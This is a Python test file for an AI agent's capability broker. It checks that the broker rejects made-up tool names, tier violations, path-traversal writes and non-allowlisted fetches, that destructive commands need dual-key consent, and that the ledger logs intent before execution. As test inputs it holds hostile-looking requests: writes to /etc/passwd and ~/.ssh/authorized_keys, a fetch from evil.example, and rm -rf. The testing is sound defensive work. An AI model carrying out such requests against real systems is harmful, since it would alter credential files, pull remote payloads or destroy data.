"""
test_broker.py — the seven steps, each with a test that tries to
skip it and fails.
"""
import os
import time

import pytest

from elora.core.broker import Rejected, Deferred
from elora.core.capabilities import Tier, REGISTRY


@pytest.fixture
def trusted_token(tmp_path):
    from conftest import token
    return token(Tier.TRUSTED, str(tmp_path / "ws"))

@pytest.fixture
def quarantine_token(tmp_path):
    from conftest import token
    return token(Tier.QUARANTINE, str(tmp_path / "ws"))


class TestStep1Exist:
    """The V4 killer: hallucinated names die here, deterministically."""

    def test_execute_command_rejected_with_truth(self, broker, trusted_token):
        result = broker.request(trusted_token, "execute_command", {})
        assert isinstance(result, Rejected)
        # Message teaches the real names — model can self-correct.
        assert "shell.run_command" in result.reason

    def test_registry_is_closed(self):
        assert "shell.run_command" in REGISTRY
        assert "shell.run_destructive" in REGISTRY
        assert "generate.image" in REGISTRY


class TestStep3Tier:
    def test_quarantine_cannot_shell(self, broker, quarantine_token):
        result = broker.request(
            quarantine_token, "shell.run_command", {"command": "echo hi"})
        assert isinstance(result, Rejected)
        assert "tier" in result.reason.lower()

    def test_trusted_can_shell(self, broker, trusted_token):
        result = broker.request(
            trusted_token, "shell.run_command", {"command": "echo hi"})
        assert not isinstance(result, Rejected)


class TestStep2Schema:
    def test_path_jail_holds(self, broker, trusted_token):
        result = broker.request(
            trusted_token, "fs.write",
            {"path": "/etc/passwd", "content": "x"})
        assert isinstance(result, Rejected)
        assert "approved roots" in result.reason

    def test_path_jail_holds_for_sneaky(self, broker, trusted_token):
        result = broker.request(
            trusted_token, "fs.write",
            {"path": "~/Desktop/../../.ssh/authorized_keys", "content": "x"})
        assert isinstance(result, Rejected)

    def test_net_allowlist(self, broker, trusted_token):
        result = broker.request(
            trusted_token, "net.fetch",
            {"url": "http://evil.example/payload", "out_path": "/tmp/x"})
        assert isinstance(result, Rejected)
        assert "raw.githubusercontent.com" in result.reason


class TestStep4Consent:
    def test_dual_key_missing_both(self, broker, trusted_token):
        result = broker.request(
            trusted_token, "shell.run_destructive",
            {"command": "rm -rf /tmp/probe"})
        assert isinstance(result, Rejected)   # env gate not set

    def test_env_key_alone_insufficient(self, broker, trusted_token,
                                        monkeypatch):
        monkeypatch.setenv("ELORA_ALLOW_DESTRUCTIVE", "1")
        result = broker.request(
            trusted_token, "shell.run_destructive",
            {"command": "rm -rf /tmp/probe"})
        # env set, consent file absent → pending, not permitted
        assert isinstance(result, (Deferred, Rejected))

    def test_consent_expires(self, broker, trusted_token, monkeypatch):
        monkeypatch.setenv("ELORA_ALLOW_DESTRUCTIVE", "1")
        consent = os.path.join(broker.consent_dir, "shell.run_destructive.txt")
        with open(consent, "w") as f:
            f.write("test-skill")
        os.utime(consent, (time.time() - 999, time.time() - 999))  # stale
        result = broker.request(
            trusted_token, "shell.run_destructive",
            {"command": "echo probe"})
        assert isinstance(result, Deferred)

    def test_consent_names_other_skill(self, broker, trusted_token, monkeypatch):
        monkeypatch.setenv("ELORA_ALLOW_DESTRUCTIVE", "1")
        consent = os.path.join(broker.consent_dir, "shell.run_destructive.txt")
        with open(consent, "w") as f:
            f.write("some-other-skill")
        os.utime(consent, (time.time() - 10, time.time() - 10))
        result = broker.request(
            trusted_token, "shell.run_destructive",
            {"command": "echo probe"})
        assert isinstance(result, Rejected)


class TestSteps5and6PreMortem:
    def test_intent_logged_before_execution(self, broker, trusted_token,
                                            ledger):
        broker.request(
            trusted_token, "shell.run_command", {"command": "echo hi"})
        kinds = [e["kind"] for e in ledger.events]
        assert kinds[0] == "capability_intent"
        assert kinds[1] == "capability_result"
        assert ledger.events[0]["message"] == "shell.run_command"

    def test_result_hashed_into_ledger(self, broker, trusted_token, ledger):
        broker.request(
            trusted_token, "shell.run_command", {"command": "echo hi"})
        result_event = next(e for e in ledger.events
                            if e["kind"] == "capability_result")
        assert len(result_event["payload"]["stdout_sha256"]) == 64

    def test_rejections_are_not_logged_as_executions(self, broker,
                                                     quarantine_token,
                                                     ledger):
        broker.request(
            quarantine_token, "shell.run_command", {"command": "echo hi"})
        # Only rejected — no intent/result pair, chain stays honest.
        assert all(e["kind"] != "capability_intent" for e in ledger.events)


class TestMetabolicPassThrough:
    def test_deferred_flows_up(self, broker, trusted_token, monkeypatch):
        from elora.core.metabolism import Deferred as MetDeferred

        class StarvedMetabolism:
            def request(self, capability):
                return MetDeferred(reason="ram_insufficient", detail="",
                                   needed_state=None, needed_mb=0,
                                   retry_after_s=60)
            def mark_used(self, capability): pass
            current_state = staticmethod(lambda: None)

        broker.metabolism = StarvedMetabolism()
        result = broker.request(
            trusted_token, "shell.run_command", {"command": "echo hi"})
        assert isinstance(result, Deferred)
        assert result.retry_after_s == 60